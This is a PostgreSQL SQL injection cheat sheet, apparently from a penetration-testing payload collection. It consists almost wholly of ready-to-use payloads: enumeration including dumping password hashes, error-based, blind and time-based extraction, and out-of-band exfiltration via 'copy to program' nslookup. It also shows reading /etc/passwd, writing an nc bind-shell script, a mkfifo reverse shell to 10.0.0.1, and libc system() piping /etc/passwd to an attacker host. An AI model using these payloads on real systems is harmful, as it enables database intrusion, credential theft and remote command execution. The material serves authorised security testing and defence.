# postgresql injection

> postgresql sql injection refers to a type of security vulnerability where attackers exploit improperly sanitized user input to execute unauthorized sql commands within a postgresql database.


## summary

* [postgresql comments](#postgresql-comments)
* [postgresql enumeration](#postgresql-enumeration)
* [postgresql methodology](#postgresql-methodology)
* [postgresql error based](#postgresql-error-based)
    * [postgresql xml helpers](#postgresql-xml-helpers)
* [postgresql blind](#postgresql-blind)
    * [postgresql blind with substring equivalent](#postgresql-blind-with-substring-equivalent)
* [postgresql time based](#postgresql-time-based)
* [postgresql out of band](#postgresql-out-of-band)
* [postgresql stacked query](#postgresql-stacked-query)
* [postgresql file manipulation](#postgresql-file-manipulation)
    * [postgresql file read](#postgresql-file-read)
    * [postgresql file write](#postgresql-file-write)
* [postgresql command execution](#postgresql-command-execution)
    * [using copy to/from program](#using-copy-tofrom-program)
    * [using libc.so.6](#using-libcso6)
* [postgresql waf bypass](#postgresql-waf-bypass)
    * [alternative to quotes](#alternative-to-quotes)
* [postgresql privileges](#postgresql-privileges)
    * [postgresql list privileges](#postgresql-list-privileges)
    * [postgresql superuser role](#postgresql-superuser-role)
* [references](#references)


## postgresql comments

| type                | comment |
| ------------------- | ------- |
| single-line comment | `--`    |
| multi-line comment  | `/**/`  |


## postgresql enumeration

| description            | sql query                               |
| ---------------------- | --------------------------------------- |
| dbms version           | `select version()`                      | 
| database name          | `select current_database()`             |
| database schema        | `select current_schema()`               |
| list postgresql users  | `select usename from pg_user`           |
| list password hashes   | `select usename, passwd from pg_shadow` |
| list db administrators | `select usename from pg_user where usesuper is true` |
| current user           | `select user;`                          |
| current user           | `select current_user;`                  |
| current user           | `select session_user;`                  |
| current user           | `select usename from pg_user;`          |
| current user           | `select getpgusername();`               |


## postgresql methodology

| description            | sql query                                    |
| ---------------------- | -------------------------------------------- |
| list schemas           | `select distinct(schemaname) from pg_tables` |
| list databases         | `select datname from pg_database`            | 
| list tables            | `select table_name from information_schema.tables` |
| list tables            | `select table_name from information_schema.tables where table_schema='<schema_name>'` |
| list tables            | `select tablename from pg_tables where schemaname = '<schema_name>'` |
| list columns           | `select column_name from information_schema.columns where table_name='data_table'` |


## postgresql error based

| name         | payload         |
| ------------ | --------------- |
| cast | `and 1337=cast('~'\|\|(select version())::text\|\|'~' as numeric) -- -` |
| cast | `and (cast('~'\|\|(select version())::text\|\|'~' as numeric)) -- -` |
| cast | `and cast((select version()) as int)=1337 -- -` |
| cast | `and (select version())::int=1 -- -` |



```sql
cast(chr(126)||version()||chr(126) as numeric)
cast(chr(126)||(select table_name from information_schema.tables limit 1 offset data_offset)||chr(126) as numeric)--
cast(chr(126)||(select column_name from information_schema.columns where table_name='data_table' limit 1 offset data_offset)||chr(126) as numeric)--
cast(chr(126)||(select data_column from data_table limit 1 offset data_offset)||chr(126) as numeric)
```

```sql
' and 1=cast((select concat('database: ',current_database())) as int) and '1'='1
' and 1=cast((select table_name from information_schema.tables limit 1 offset data_offset) as int) and '1'='1
' and 1=cast((select column_name from information_schema.columns where table_name='data_table' limit 1 offset data_offset) as int) and '1'='1
' and 1=cast((select data_column from data_table limit 1 offset data_offset) as int) and '1'='1
```

### postgresql xml helpers

```sql
select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
```

the `query_to_xml` above returns all the results of the specified query as a single result. chain this with the [postgresql error based](#postgresql-error-based) technique to exfiltrate data without having to worry about `limit`ing your query to one result.

```sql
select database_to_xml(true,true,''); -- dump the current database to xml
select database_to_xmlschema(true,true,''); -- dump the current db to an xml schema
```

note, with the above queries, the output needs to be assembled in memory. for larger databases, this might cause a slow down or denial of service condition.


## postgresql blind

### postgresql blind with substring equivalent

| function    | example                                         |
| ----------- | ----------------------------------------------- | 
| `substr`    | `substr('foobar', <start>, <length>)`           |
| `substring` | `substring('foobar', <start>, <length>)`        | 
| `substring` | `substring('foobar' from <start> for <length>)` | 

examples:

```sql
' and substr(version(),1,10) = 'postgresql' and '1  -- true
' and substr(version(),1,10) = 'postgrexxx' and '1  -- false
```


## postgresql time based

#### identify time based

```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

#### database dump time based

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

#### table dump time based

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

#### columns dump time based

```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
```

```sql
and 'randstr'||pg_sleep(10)='randstr'
and [randnum]=(select [randnum] from pg_sleep([sleeptime]))
and [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
```

## postgresql out of band

out-of-band sql injections in postgresql relies on the use of functions that can interact with the file system or network, such as `copy`, `lo_export`, or functions from extensions that can perform network actions. the idea is to exploit the database to send data elsewhere, which the attacker can monitor and intercept. 

```sql
declare c text;
declare p text;
begin
select into p (select your-query-here);
c := 'copy (select '''') to program ''nslookup '||p||'.burp-collaborator-subdomain''';
execute c;
end;
$$ language plpgsql security definer;
select f();
```


## postgresql stacked query

use a semi-colon "`;`" to add another query

```sql
select 1;create table notsosecure (data varchar(200));--
```


## postgresql file manipulation

### postgresql file read

note: earlier versions of postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. newer versions (as of [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.

* using `pg_read_file`, `pg_ls_dir`

    ```sql
    select pg_ls_dir('./');
    select pg_read_file('pg_version', 0, 200);
    ```

* using `copy`

    ```sql
    create table temp(t text);
    copy temp from '/etc/passwd';
    select * from temp limit 1 offset 0;
    ```

* using `lo_import`

    ```sql
    select lo_import('/etc/passwd'); -- will create a large object from the file and return the oid
    select lo_get(16420); -- use the oid returned from the above
    select * from pg_largeobject; -- or just get all the large objects and their data
    ```


### postgresql file write

* using `copy`

    ```sql
    create table nc (t text);
    insert into nc(t) values('nc -lvvp 2346 -e /bin/bash');
    select * from nc;
    copy nc(t) to '/tmp/nc.sh';
    ```

* using `copy` (one-line)

    ```sql
    copy (select 'nc -lvvp 2346 -e /bin/bash') to '/tmp/pentestlab';
    ```

* using `lo_from_bytea`, `lo_put` and `lo_export`

    ```sql
    select lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with oid 43210 and some data
    select lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
    select lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
    ```


## postgresql command execution

### using copy to/from program

installations running postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `copy`.

```sql
copy (select '') to program 'nslookup burp-collaborator-subdomain'
```

```sql
create table shell(output text);
copy shell from program 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```


### using libc.so.6

```sql
create or replace function system(cstring) returns int as '/lib/x86_64-linux-gnu/libc.so.6', 'system' language 'c' strict;
select system('cat /etc/passwd | nc <attacker ip> <attacker port>');
```


## postgresql waf bypass

### alternative to quotes

| payload            | technique |
| ------------------ | --------- |
| `select chr(65)\|\|chr(66)\|\|chr(67);` | string from `chr()` |
| `select $tag$this` | dollar-sign ( >= version 8 postgresql)   |


## postgresql privileges

### postgresql list privileges

retrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog` and `information_schema`.

```sql
select * from information_schema.role_table_grants where grantee = current_user and table_schema not in ('pg_catalog', 'information_schema');
```

### postgresql superuser role

```sql
show is_superuser; 
select current_setting('is_superuser');
select usesuper from pg_user where usename = current_user;
```

## references

- [a penetration tester's guide to postgresql - david hayter - july 22, 2017](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
- [advanced postgresql sql injection and filter bypass techniques - leon juranic - june 17, 2009](https://www.infigo.hr/files/infigo-td-2009-04_postgresql_injection_eng.pdf)
- [authenticated arbitrary command execution on postgresql 9.3 > latest - greenwolf - march 20, 2019](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
- [postgres sql injection cheat sheet - @pentestmonkey - august 23, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
- [postgresql 9.x remote command execution - dionach - october 26, 2017](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
- [sql injection /webapp/oma_conf ctx parameter - sergey bobrov (bobrov) - december 8, 2016](https://hackerone.com/reports/181803)
- [sql injection and postgres - an adventure to eventual rce - denis andzakovic - may 5, 2020](https://pulsesecurity.co.nz/articles/postgres-sqli)
